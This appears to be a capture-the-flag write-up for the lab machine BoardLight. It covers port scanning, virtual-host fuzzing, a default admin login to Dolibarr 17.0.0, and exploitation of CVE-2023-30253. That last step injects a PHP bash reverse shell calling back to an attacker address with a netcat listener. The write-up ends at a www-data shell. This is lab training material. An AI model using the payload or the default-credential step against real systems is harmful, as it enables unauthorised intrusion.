---
description: Linux | easy | Dolibarr (v17.0.0) | CVE-2023-30253 | Mysql
---

# BoardLight



## Reconnaissance

```bash
nmap 10.129.11.23 -sV -sC 
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Lets Check the Http server.&#x20;

We can see the domain name in the front page :&#x20;

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Lets update the Hosts File&#x20;

```bash
echo "10.129.11.23 board.htb" | sudo tee -a /etc/hosts
```

## Enumeration

no usefull directories was found on board.htb with gobuster  so lets try to find some vhost.&#x20;

```bash
ffuf -w /opt/useful/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://board.htb:80/ -H 'Host: FUZZ.board.htb' -mc 200 -fw 6243
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

## Initial Foothold

so lets add this vhost to our hosts file too .&#x20;

```bash
echo "10.129.11.23 crm.board.htb" | sudo tee -a /etc/hosts
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

First things first lets try to enter the default credentials of the version 17.0.0 (admin/admin)

we are in  :&#x20;

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

its time to look for an active CVE on this version.&#x20;

We got one RCE [https://www.swascan.com/security-advisory-dolibarr-17-0-0/](https://www.swascan.com/security-advisory-dolibarr-17-0-0/)

So in order to exploit it we have to create a new page and inject a php code. lets try to inject a reverse shell. lets setup our netcat on port 4444 and the inject the following php code in a new page.&#x20;

```php
<?PHP shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.20/4444 0>&1'"); ?>
```

```bash
nc -lnvp 4444
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

and then when we use the preview button of our new page we trigger the reverse shell :

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

we are now www-data let see if we can find some usefull infos .
